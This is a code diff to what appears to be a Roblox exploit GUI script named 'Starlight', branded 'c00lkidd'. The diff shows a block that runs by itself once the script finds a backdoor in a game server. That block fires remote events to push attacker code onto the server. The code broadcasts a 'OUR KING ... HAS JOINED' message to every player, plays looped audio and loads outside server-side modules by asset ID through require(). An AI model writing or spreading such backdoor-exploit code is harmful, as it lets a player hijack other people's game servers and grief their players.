@@ -1,5 +1,3 @@
-_G.RenderHook = function(callback) if RunService and RunService.RenderStepped then return RunService.RenderStepped:Connect(callback) else return task.spawn(function() while true do callback(1/60) task.wait(1/60) end end) end end
--- c00lkidd
 local Converted = {
 	["_Starlight"] = Instance.new("ScreenGui");
 	["_Frame"] = Instance.new("Frame");
@@ -2542,9 +2540,9 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				Duration = 4
 			})
                      -- Auto executes
-                        fireRemoteEvent('local h = Instance.new(\"Hint\",workspace)\nh.Text = \"\xF0\x9F\x91\x91 OUR KING \".. game.Players.LocalPlayer.DisplayName .. \" HAS JOINED! \xF0\x9F\x91\x91\"\nwait(12)\nh:Destroy()\nwait(0.1)\nlocal sound = Instance.new(\"Sound\")\nsound.Parent = workspace\nsound.SoundId = \"rbxassetid://96610114209889\"\nsound.Looped = true\nsound.Playing = true\nsound.Volume = 0.5\nsound.PlaybackSpeed = 1\nsound.TimePosition = 17.5\nwait(11.5)\nsound.TimePosition = 18')
+                        fireRemoteEvent('local h = Instance.new("Hint", workspace) h.Text = "👑 OUR KING " .. game.Players.LocalPlayer.DisplayName .. " HAS JOINED! 👑" wait(12) h:Destroy() wait(0.1) local sound = Instance.new("Sound") sound.Parent = workspace sound.SoundId = "rbxassetid://96610114209889" sound.Looped = true sound.Playing = true sound.Volume = 0.5 sound.PlaybackSpeed = 1 sound.TimePosition = 17.5 wait(11.5) sound.TimePosition = 18')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
-                        fireRemoteEvent('require(3986243232).load("No good sir this is c00okid serverside",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+                        fireRemoteEvent('require(3986243232).load("No good sir this is c00lkid serverside",{"' .. game.Players.LocalPlayer.Name ..  '"})')
 		else
 			script.Parent.Framee.Check.Text = "backdoor not found!"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
